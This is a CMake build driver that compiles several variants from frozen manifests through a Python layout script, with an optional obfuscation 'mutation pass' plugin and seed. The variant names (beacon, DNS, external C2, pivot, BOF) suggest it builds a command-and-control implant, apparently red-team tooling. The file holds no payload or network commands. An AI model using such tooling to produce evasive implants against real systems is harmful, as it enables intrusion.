# tools/llvm/CMakeLists.txt — the CMake variant driver (Phase 5: the only
# project-definition consumer). Per variant it reads the COMMITTED frozen
# manifest (tools/llvm/manifests/<variant>.json — sources/flags/link
# resolved from the retired vcxproj model at freeze time) and drives
# layout_two_pass.py (compile/link/two-pass layout loop).
#
#   cmake -S tools/llvm -B build/llvm -DREPO=... -DXWIN_DIR=... \
#         -DCLANG_CL=... -DLLD_LINK=... \
#         -DVARIANTS="beacon-x64-wininet-layout;beacon-x64-winhttp-layout;..." \
#         [-DOBF_SO=... -DOBF_SEED=...]
#   cmake --build build/llvm --target all-variants
cmake_minimum_required(VERSION 3.16)
project(beacon_llvm_variants NONE)

set(REPO "" CACHE PATH "repo root")
set(XWIN_DIR "" CACHE PATH "xwin splat")
set(CLANG_CL "" CACHE FILEPATH "clang-cl binary")
set(LLD_LINK "" CACHE FILEPATH "lld-link binary")
set(OBF_SO "" CACHE FILEPATH "mutation pass plugin (optional)")
set(OBF_SEED "1337" CACHE STRING "mutation seed")
set(OUT_DIR "" CACHE PATH "output root (defaults to <binary>/out)")
set(JOBS "3" CACHE STRING "parallel compile jobs")
set(PYTHON "python3" CACHE STRING "python interpreter (windows runners: python)")

set(VARIANTS "" CACHE STRING "semicolon list of manifest basenames (tools/llvm/manifests/<name>.json)")
if(NOT VARIANTS)
  set(VARIANTS "beacon-x64-wininet-layout;beacon-x64-winhttp-layout;dnsb-x64-wininet-layout;extc2-x64-wininet-layout;pivot-x64-wininet-layout;beacon-x64-wininet-plainsleep+layout;beacon-x64-wininet-noexcreg;beacon-x64-wininet-diagretaddr;beacon-x64-wininet-bofwin")
endif()

if(NOT REPO OR NOT XWIN_DIR OR NOT CLANG_CL OR NOT LLD_LINK)
  message(FATAL_ERROR "REPO/XWIN_DIR/CLANG_CL/LLD_LINK required")
endif()
if(NOT OUT_DIR)
  set(OUT_DIR "${CMAKE_CURRENT_BINARY_DIR}/out")
endif()
file(MAKE_DIRECTORY "${OUT_DIR}")

set(ALL_TARGETS "")
foreach(V ${VARIANTS})
  set(MANIFEST "${CMAKE_CURRENT_SOURCE_DIR}/manifests/${V}.json")
  if(NOT EXISTS ${MANIFEST})
    message(FATAL_ERROR "frozen manifest missing: ${MANIFEST}")
  endif()

  set(OBF_ARGS "")
  if(OBF_SO)
    list(APPEND OBF_ARGS "--obf=${OBF_SO}")
  endif()

  set(TOOL_ARGS "")
  if(TOOLCHAIN STREQUAL "msvc")
    # cl.exe/link.exe come from the msvc-dev-cmd environment; the manifest
    # flags are clang-cl-style which cl.exe accepts verbatim, and the
    # /libpath:$(XWIN) tokens are dropped (MSVC link resolves SDK libs
    # from its own env).
    list(APPEND TOOL_ARGS "--cc=cl" "--link-exe=link")
  else()
    list(APPEND TOOL_ARGS "--clang-cl=${CLANG_CL}" "--lld-link=${LLD_LINK}")
  endif()

  add_custom_target(${V}
    COMMAND ${CMAKE_COMMAND} -E env OBF_SEED=${OBF_SEED}
            ${PYTHON} ${CMAKE_CURRENT_SOURCE_DIR}/layout_two_pass.py
            --manifest ${MANIFEST} --repo ${REPO}
            --xwin-dir ${XWIN_DIR} --out-dir "${OUT_DIR}/${V}"
            ${TOOL_ARGS} --jobs ${JOBS}
    WORKING_DIRECTORY ${REPO}
    COMMENT "variant ${V}"
    VERBATIM)
  list(APPEND ALL_TARGETS ${V})
endforeach()

add_custom_target(all-variants DEPENDS ${ALL_TARGETS}
  COMMENT "all product variants")
